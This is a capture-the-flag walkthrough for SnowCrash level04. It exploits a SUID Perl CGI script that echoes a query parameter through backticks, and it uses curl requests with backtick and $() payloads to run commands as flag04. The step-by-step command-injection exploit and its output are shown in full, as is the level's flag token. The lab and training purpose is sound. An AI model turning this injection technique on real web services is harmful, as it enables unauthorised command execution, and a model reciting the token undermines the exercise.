We run the command "ls -l" in the home directory.

level04@SnowCrash:~$ ls -l
total 4
-rwsr-sr-x 1 flag04 level04 152 Mar  5  2016 level04.pl

We have a .pl which is part of SUID of flag04, so we need to find an exploit so we execute getflag using this .pl code.

So at 1st we check what's inside the .pl:

level04@SnowCrash:~$ cat level04.pl
#!/usr/bin/perl
# localhost:4747
use CGI qw{param};
print "Content-type: text/html\n\n";
sub x {
  $y = $_[0];
  print `echo $y 2>&1`;
}
x(param("x"));v

We Notice that the code establish a connection with the port 4747, we check that using nectat (https://linuxize.com/post/netcat-nc-command-with-examples/#:~:text=Netcat%20(or%20nc%20)%20is%20a,army%20knife%20of%20networking%20tools.):

level04@SnowCrash:~$ nc -zv 192.168.56.102 4747
Connection to 192.168.56.102 4747 port [tcp/*] succeeded!

As we can see, we can connect to the port 4747.

While also examining the code we can see the .pl ask for 1 argument (y = $_[0];) with the name of x (param("x")).

So lets try and execute some basic bash commands as arguments and see.

level04@SnowCrash:~$ ./level04.pl x="whoami"
Content-type: text/html

whoami

As we can see it just take the string and prints it.

Lets now try to do an OS injection by using backticks ` ` or $().  (https://portswigger.net/web-security/os-command-injection)

level04@SnowCrash:~$ ./level04.pl x="$(whoami)"
Content-type: text/html

level04

As we can see while executing whoami we see that by executing it this way we still use level04 privileges but we need flag04 privileges.

So we do it with curl Or just open a navigator and type the url by using query parameters (https://www.quora.com/What-are-exactly-query-parameters-in-URLs-and-how-they-work):

level04@SnowCrash:~$ curl '192.168.56.102:4747/level04.pl?x="`whoami`"'
flag04

As we can see now we are in flag04, so what is left is just to execute getflag

level04@SnowCrash:~$ curl '192.168.56.102:4747/level04.pl?x="`getflag`"' or level04@SnowCrash:~$ curl '192.168.56.102:4747/level04.pl?x="$(getflag)"'
Check flag.Here is your token : ne2searoevaevoem4ov4ar8ap
